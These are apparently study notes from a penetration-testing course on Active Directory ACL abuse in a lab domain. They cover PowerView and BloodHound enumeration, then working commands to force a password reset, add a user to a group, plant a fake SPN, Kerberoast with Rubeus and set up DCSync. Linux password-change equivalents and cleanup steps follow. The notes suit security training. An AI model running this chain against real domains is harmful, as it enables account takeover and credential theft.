not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. *If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it*.
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

![[acl_dacl_sacl_tree.svg|855]]

### Access Control Entries (ACEs)

There are `three` main types of ACEs that can be applied to all securable objects in AD:

| **ACE**              | **Description**                                                                                                                                                            |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object                                                                                   |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object                                                                                  |
| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred |

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object




----

## ACL Enumeration

#### POWERVIEW

```POWERSHELL
Find-InterestingDomainAcl
```

this will give us a lot of information which is likely overwhelm us and its time consuming to do that 

there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over.

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
```

#### Using Get-DomainObjectACL

We can then use the `Get-DomainObjectACL` function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us _who_ has the given right over an object.

*One important thing to note is that if we search without the flag `ResolveGUIDs`, we will see results like the below, where the right `ExtendedRight` does not give us a clear picture of what ACE entry the user `wley` has over `damundsen`. This is because the `ObjectAceType` property is returning a GUID value that is not human readable.*

**without -ResolveGUID FLAG**

```POWERSHELL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

 Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

#### Performing a Reverse Search & Mapping to a GUID Value

```POWERSHELL

$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

**PowerView has the `ResolveGUIDs` flag, which does this very thing for us**

#### Using the -ResolveGUIDs Flag

```POWERSHELL
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

---

quick look at how we could do this using the [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) and [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial

#### Creating a List of Domain Users

```POWERSHELL
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

*We then read each line of the file using a `foreach` loop, and use the `Get-Acl` cmdlet to retrieve ACL information for each domain user by feeding each line of the `ad_users.txt` file to the `Get-ADUser` cmdlet. We then select just the `Access property`, which will give us information about access rights. Finally, we set the `IdentityReference` property to the user we are in control of (or looking to see what rights they have)*

```POWERSHELL
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user `wley` and now have control over the user `damundsen` via the `User-Force-Change-Password` extended right. Let's use Powerview to hunt for where, if anywhere, control over the `damundsen` account could take us.

#### Further Enumeration of Rights Using damundsen

```powershell
$sid2 = Convert-NameToSid damundsen

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Now we can see that our user `damundsen` has `GenericWrite` privileges over the `Help Desk Level 1` group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.

#### Investigating the Help Desk Level 1 Group with Get-DomainGroup

```powershell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

 A quick search shows us that the `Help Desk Level 1` group is nested into the `Information Technology` group, meaning that we can obtain any rights that the `Information Technology` group grants to its members if we just add ourselves to the `Help Desk Level 1` group where our user `damundsen` has `GenericWrite` privileges.

- We have control over the user `wley` whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
- We enumerated objects that the user `wley` has control over and found that we could force change the password of the user `damundsen`
- From here, we found that the `damundsen` user can add a member to the `Help Desk Level 1` group using `GenericWrite` privileges
- The `Help Desk Level 1` group is nested into the `Information Technology` group, which grants members of that group any rights provisioned to the `Information Technology` group

#### Investigating the Information Technology Group

```powershell
$itgroupsid = Convert-NameToSid "Information Technology"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

```

 doing our search using `Get-DomainObjectACL` shows us that members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could:

- Modify group membership
- Force change a password
- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

let's see if the `adunn` user has any type of interesting access that we may be able to leverage to get closer to our goal.

```powershell
$adunnsid = Convert-NameToSid adunn

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

*`adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack.*

#### FINDING THE ACL ON A GROUP OR A SPECIFIC OBJECT FOR A USER 

```POWERSHELL
#sid of the user which we want to check the acl of 
$sid = convert-nametosid username

get-domainobjectacl -identity "GPO Management" -ResolveGUIDs | where-object {$_.SecurityIdentifier -eq $sid}
```
## Enumerating ACLs with BloodHound

we can set the `wley` user as our starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`. If we click on the `1` next to `First Degree Object Control`, we see the first set of rights that we enumerated, `ForceChangePassword` over the `damundsen` user.

#### Viewing Node Info through BloodHound

![BloodHound interface showing node info for WLEY@INLANEFREIGHT.LOCALl with execution and control rights, connected to DAMUNDSEN@INLANEFREIGHT.LOCAL via ForceChangePassword.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/wley_damundsen.png)

If we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:

- More info on the specific right, tools, and commands that can be used to pull off this attack
- Operational Security (Opsec) considerations
- External references.

We'll dig into this menu more later on.

#### Investigating ForceChangePassword Further

![Popup window in BloodHound showing ForceChangePassword capability for WLEY@INLANEFREIGHT.LOCAL to change DAMUNDSEN@INLANEFREIGHT.LOCAL's password without knowing the current password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/help_edge.png)

If we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.

#### Viewing Potential Attack Paths through BloodHound

![BloodHound graph showing WLEY@INLANEFREIGHT.LOCAL's connections to various groups and users, including CONTRACTORS, FILE SHARE, and DOMAIN USERS, with relationships like MemberOf and ForceChangePassword.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/wley_path.png)

Finally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.

#### Viewing Pre-Build queries through BloodHound

![BloodHound graph showing ADUNN@INLANEFREIGHT.LOCAL's connections to various groups and users, including DOMAIN ADMINS and ENTERPRISE DOMAIN CONTROLLERS, with relationships like MemberOf and GetChangesAll.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/adunn_dcsync.png)


## Abusing ACLs

first, we must authenticate as `wley` and force change the password of the user `damundsen`. We can start by opening a PowerShell console and authenticating as the `wley` user.

#### Creating a PSCredential Object

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

 we must create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.

#### Creating a SecureString Object

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password. We need to use the `-Credential` flag with the credential object we created for the `wley` user. It's best to always specify the `-Verbose` flag to get feedback on the command completing as expected or as much information about errors as possible. *We could do this from a Linux attack host using a tool such as `pth-net`, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).*

#### Changing the User's Password

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbos
```

used securestring for password of damundsen and credential object containing username and password of user wley

Next, we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.

#### Creating a SecureString Object using damundsen

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

 we can use the [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the `pth-toolkit`.

#### Adding damundsen to the Help Desk Level 1 Group

**verifying damundsen is not a member of the group**
```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

**adding damundsen to the group**
```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### Confirming damundsen was Added to the Group

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over the `adunn` user. Now, let's say that our client permitted us to change the password of the `damundsen` user, but the `adunn` user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

Since we added `damundsen` to the `Help Desk Level 1` group, we inherited rights via nested group membership. We can now use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN. *We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.*

### Creating a Fake SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

#### Kerberoasting with Rubeus

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

 The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack

## CHANGING PASSWORDS WITH LINUX 

`Set-DomainUserPassword` in PowerView changes a **domain** user's password (assuming you have the rights — `GenericAll`, `GenericWrite`, `User-Force-Change-Password` extended right, etc. over that user object). The direct equivalents on Linux are:

**Impacket's `changepasswd.py`** — closest 1:1 match:

bash

```bash
changepasswd.py INLANEFREIGHT.LOCAL/attacker:'AttackerPass' -newpass 'NewP@ssw0rd!' -user targetuser -altuser attacker -altpass 'AttackerPass'
```

Or more simply, if you're changing your own compromised account's password:

bash

```bash
changepasswd.py inlanefreight.local/targetuser@dc01.inlanefreight.local -newpass 'NewP@ssw0rd!'
```

**`rpcclient`** — using SAMR, similar to how PowerView talks over the same protocol underneath:

bash

```bash
rpcclient -U attacker%AttackerPass //dc01.inlanefreight.local -c "setuserinfo2 targetuser 23 'NewP@ssw0rd!'"
```

**`samba-tool`** — if you're on a box with Samba tools and rights (e.g. DA creds or delegated rights):

bash

```bash
samba-tool user setpassword targetuser --newpassword='NewP@ssw0rd!'
```

**`net rpc password`** (Samba's `net` binary, old-school but still works):

bash

```bash
net rpc password targetuser 'NewP@ssw0rd!' -U attacker%AttackerPass -S dc01.inlanefreight.local
```

**`kpasswd`** (Kerberos-native, if you have creds/hash for a ticket):

bash

```bash
kpasswd targetuser@INLANEFREIGHT.LOCAL
```

### Key considerations, same as PowerView

- You need one of: a delegated right on the target user object (`ForceChangePassword`, `GenericWrite`, `GenericAll`), or high-priv creds (DA/EA)
- Password policy still applies (complexity, length, history) — a bad password will get rejected same as in AD from Windows
- Changing a password is loud — it's an obvious, logged, and often alerted-on action (event 4724/4738 on the DC). Only do it when it's actually the right move (e.g. `ForceChangePassword` abuse chain on HTB Academy where you have no other path in), not as your default move on a box you own
- Kerberoasting/etc. don't need this — this is specifically for abusing write privileges over an account, so make sure that's actually your scenario before reaching for it
## Cleanup - notforoscp

#### Removing the Fake SPN from adunn's Account
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

#### Removing damundsen from the Help Desk Level 1 Group
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### Confirming damundsen was Removed from the Group
```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

